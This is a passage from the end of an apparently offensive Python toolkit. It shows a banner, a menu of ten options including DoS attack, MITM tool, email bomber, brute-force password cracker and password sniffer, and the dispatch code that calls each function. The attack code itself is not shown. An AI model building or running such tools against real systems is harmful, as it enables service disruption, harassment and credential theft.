           |___ |___ |__|  \/  |___ |  \ |    | |___ |___ |__/ 
           Author : Arafa Yoncalik                                               
    """)

    print(Style.RESET_ALL)
    print(Fore.RED +"1 - DOS ATTACK")
    print(Fore.LIGHTRED_EX +"2 - WEB SCRAPER")
    print(Fore.YELLOW +"3 - 3-WAY HOST DISCOVERY")
    print(Fore.LIGHTYELLOW_EX +"4 - BANNER GRABBER")
    print(Fore.GREEN +"5 - MITM TOOL")
    print(Fore.LIGHTGREEN_EX +"6 - WEB SERVER DIRECTORY AND FILE ENUMERATOR")
    print(Fore.BLUE +"7 - EMAIL BOMBER")
    print(Fore.LIGHTBLUE_EX +"8 - BRUTEFORCE PASSWORD CRACKER")
    print(Fore.MAGENTA +"9 - PASSWORD ENCODER/DECODER")
    print(Fore.LIGHTMAGENTA_EX +"10 - PASSWORD SNIFFER")
    print("")

    option = int(input(Fore.CYAN +"CHOOSE AN OPTION BETWEEN 1-10 TO EXECUTE PROGRAM (SELECT 0 TO EXIT)\n"))

    if (option == 0):
        print("Goodbye...")
        sys.exit()
    elif (option == 1):
        DoSAttack()
    elif (option == 2):
        WebScraper()
    elif (option == 3):
        HostDiscovery()
    elif (option == 4):
        BannerGrabber()
    elif (option == 5):
        MITMTool()
    elif (option == 6):
        WebServerDirAndFileEnumerator()
    elif (option == 7):
        EmailBomber()
    elif (option == 8):
        BruteforcePasswordCracker()
    elif (option == 9):
        PasswordEncodeDecode()
    elif(option == 10):
        PasswordSnif()
    else:
        print("INVALID INPUT")

init()
